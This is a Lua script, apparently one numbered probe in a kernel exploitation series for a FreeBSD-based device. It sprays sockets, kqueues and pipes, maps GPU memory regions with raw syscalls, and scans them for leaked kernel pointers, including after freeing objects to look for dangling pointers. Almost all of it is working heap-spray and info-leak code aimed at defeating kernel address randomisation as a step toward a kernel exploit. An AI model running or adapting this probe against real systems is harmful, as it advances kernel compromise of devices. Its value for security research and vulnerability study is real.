-- CRASH_CLASS: LOW
-- PROBE 124a: Heap kernel pointer spray and scan
-- Strategy: allocate many kernel objects (sockets, kqueues, pipes) then
-- scan the GPU mmap heap region for kernel pointers that leaked via
-- adjacent allocations. The kernel slab allocator may place kernel
-- metadata adjacent to userland-visible buffers.

print("=== PROBE 124a: HEAP KPTR SPRAY ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

print("pid=" .. to_num(syscall.getpid()))

local sc_mmap = make_syscall(477)
local sc_socket = make_syscall(97)
local sc_kqueue = make_syscall(362)
local sc_pipe2 = make_syscall(542)
local sc_close = make_syscall(6)

-- Phase 1: Take a heap snapshot BEFORE spraying objects
print("")
print("--- PHASE 1: BASELINE HEAP SCAN ---")

local gpu_region = sc_mmap(uint64(0), uint64(64*0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu_base_hi, gpu_base_lo = get_hi_lo(gpu_region)
print(string.format("gpu_base=0x%X%08X", gpu_base_hi, gpu_base_lo))

local baseline_kptrs = {}
local scan_size = 64 * 0x4000
for off = 0, scan_size - 8, 8 do
    local addr = uint64(string.format("0x%X%08X", gpu_base_hi, gpu_base_lo + off))
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok and val then
        local h, l = get_hi_lo(val)
        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
            baseline_kptrs[off] = {h=h, l=l}
        end
    end
end
local baseline_count = 0
for _ in pairs(baseline_kptrs) do baseline_count = baseline_count + 1 end
print("baseline_kptrs=" .. baseline_count)

-- Phase 2: Spray kernel objects to create kernel allocations near GPU mmap
print("")
print("--- PHASE 2: OBJECT SPRAY ---")

local fds = {}
-- Create 100 sockets (each allocates kernel socket + file structs)
for i = 1, 100 do
    local ok, fd = pcall(function()
        return sc_socket(uint64(2), uint64(1), uint64(0)) -- AF_INET SOCK_STREAM
    end)
    if ok and to_num(fd) >= 0 then
        fds[#fds+1] = fd
    end
end
print("sockets_created=" .. #fds)

-- Create 50 kqueues
local kq_fds = {}
for i = 1, 50 do
    local ok, fd = pcall(function() return sc_kqueue() end)
    if ok and to_num(fd) >= 0 then
        kq_fds[#kq_fds+1] = fd
    end
end
print("kqueues_created=" .. #kq_fds)

-- Create 50 pipe pairs
local pipe_fds = {}
local pipe_buf = memory.alloc(16)
for i = 1, 50 do
    local ok, ret = pcall(function() return sc_pipe2(uint64(pipe_buf), uint64(0)) end)
    if ok and to_num(ret) == 0 then
        local r = to_num(memory.read_dword(pipe_buf))
        local w = to_num(memory.read_dword(pipe_buf + 4))
        pipe_fds[#pipe_fds+1] = {r=r, w=w}
    end
end
print("pipes_created=" .. #pipe_fds)

-- Phase 3: Allocate NEW GPU mmap regions adjacent to the sprayed objects
print("")
print("--- PHASE 3: POST-SPRAY HEAP SCAN ---")

local gpu2 = sc_mmap(uint64(0), uint64(64*0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu2_hi, gpu2_lo = get_hi_lo(gpu2)
print(string.format("gpu2_base=0x%X%08X", gpu2_hi, gpu2_lo))

local new_kptrs = {}
for off = 0, scan_size - 8, 8 do
    local addr = uint64(string.format("0x%X%08X", gpu2_hi, gpu2_lo + off))
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok and val then
        local h, l = get_hi_lo(val)
        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
            new_kptrs[off] = {h=h, l=l}
        end
    end
end
local new_count = 0
for off, kp in pairs(new_kptrs) do
    new_count = new_count + 1
    if new_count <= 20 then
        print(string.format("  KPTR +0x%05X: 0x%08X%08X", off, kp.h, kp.l))
    end
end
print("post_spray_kptrs=" .. new_count)

-- Phase 4: Also scan the ORIGINAL region again for new pointers
print("")
print("--- PHASE 4: ORIGINAL REGION RESCAN ---")
local changed = 0
for off = 0, scan_size - 8, 8 do
    local addr = uint64(string.format("0x%X%08X", gpu_base_hi, gpu_base_lo + off))
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok and val then
        local h, l = get_hi_lo(val)
        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
            if not baseline_kptrs[off] then
                changed = changed + 1
                if changed <= 20 then
                    print(string.format("  NEW +0x%05X: 0x%08X%08X", off, h, l))
                end
            end
        end
    end
end
print("new_kptrs_in_original=" .. changed)

-- Phase 5: Close half the objects and scan for dangling pointers
print("")
print("--- PHASE 5: FREE AND RESCAN ---")
for i = 1, 50 do
    if fds[i] then pcall(function() sc_close(fds[i]) end) end
end
for i = 1, 25 do
    if kq_fds[i] then pcall(function() sc_close(kq_fds[i]) end) end
end

-- Allocate a third region to hopefully land on freed slabs
local gpu3 = sc_mmap(uint64(0), uint64(64*0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu3_hi, gpu3_lo = get_hi_lo(gpu3)
print(string.format("gpu3_base=0x%X%08X", gpu3_hi, gpu3_lo))

local freed_kptrs = 0
for off = 0, scan_size - 8, 8 do
    local addr = uint64(string.format("0x%X%08X", gpu3_hi, gpu3_lo + off))
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok and val then
        local h, l = get_hi_lo(val)
        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
            freed_kptrs = freed_kptrs + 1
            if freed_kptrs <= 20 then
                print(string.format("  FREED_KPTR +0x%05X: 0x%08X%08X", off, h, l))
            end
        end
    end
end
print("freed_region_kptrs=" .. freed_kptrs)

-- Cleanup remaining fds
for i = 51, #fds do pcall(function() sc_close(fds[i]) end) end
for i = 26, #kq_fds do pcall(function() sc_close(kq_fds[i]) end) end
for _, p in ipairs(pipe_fds) do
    pcall(function() sc_close(uint64(p.r)) end)
    pcall(function() sc_close(uint64(p.w)) end)
end

print("=== PROBE 124a COMPLETE ===")
